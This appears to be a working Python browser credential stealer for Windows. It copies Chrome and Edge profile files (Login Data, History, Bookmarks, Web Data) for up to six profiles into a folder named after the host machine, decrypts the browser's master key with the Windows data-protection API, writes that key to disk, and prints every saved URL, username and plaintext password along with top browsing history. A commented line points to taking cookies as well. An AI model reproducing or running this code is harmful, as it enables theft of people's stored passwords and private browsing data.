import base64
import os
import sys
import shutil
import json
import platform
import sqlite3

#pip install pywin32
from win32crypt import CryptUnprotectData
#pip install pycryptodomex
from Cryptodome.Cipher import AES
#alternative: pip install pycryptodome
#from Crypto.Cipher import AES

def copyFile(sourceFolder, destinationFolder):
    if os.path.exists(sourceFolder):
        shutil.copy2(sourceFolder, destinationFolder)
    else:
        print(f'File {sourceFolder} does not exist')

def decryptData(data, key):
    iv = data[3:15]
    payload = data[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass

scriptpath = os.path.dirname(os.path.realpath(__file__))

if getattr(sys, 'frozen', False):
    scriptpath = os.path.dirname(sys.executable)
elif __file__:
    scriptpath = os.path.dirname(os.path.realpath(__file__))

appdata = os.getenv('LOCALAPPDATA')
browsers = {
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
}
profiles = [
    'Default',
    'Profile 1',
    'Profile 2',
    'Profile 3',
    'Profile 4',
    'Profile 5',
]

for name, path in browsers.items():
    if not os.path.exists(path):
        continue

    for profile in profiles:
        if not os.path.exists(path + '\\' + profile):
            continue

        #Copy all the files#############################################################
        sourceFolder = f'{path}\\{profile}'
        destinationFolder = f'{scriptpath}\\{platform.uname()[1]}\\{name}\\{profile}'

        os.makedirs(destinationFolder, exist_ok=True)
        copyFile(sourceFolder + '\\' + 'Bookmarks',        destinationFolder)
        copyFile(sourceFolder + '\\' + 'History',          destinationFolder)
        copyFile(sourceFolder + '\\' + 'Login Data',       destinationFolder)
        copyFile(sourceFolder + '\\' + 'Visited Links',    destinationFolder)
        copyFile(sourceFolder + '\\' + 'Web Data',         destinationFolder)
        
        #--disable-features=LockProfileCookieDatabase
        #copyFile(sourceFolder + '\\' + 'Network\\Cookies', destinationFolder)

        #Retrive, decrypt and save key##################################################
        with open(f'{path}\\Local State', "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

        with open(f'{destinationFolder}\\..\\Local State', "wb") as f:
            f.write(master_key)

        #Display information from the database##########################################
        conn = sqlite3.connect(f'{destinationFolder}\\Login Data')
        cursor = conn.cursor()
        cursor.execute('Select origin_url, username_value, password_value From logins WHERE blacklisted_by_user = 0')
        print(f'\n{"-"*20}Passwords{"-"*21}')
        for row in cursor.fetchall():
            password = decryptData(row[2], master_key)
            print(f'URL: {row[0]}')
            print(f'Username: {row[1]}')
            print(f'Password: {password}')
            print('-'*5)
        conn.close()
        print('-'*50)

        conn = sqlite3.connect(f'{destinationFolder}\\History')
        cursor = conn.cursor()
        cursor.execute('Select url, title, visit_count From urls ORDER BY visit_count DESC LIMIT 10')
        print(f'\n{"-"*21}History{"-"*22}')
        for row in cursor.fetchall():
            print(row)
        print('-'*50)
        conn.close()
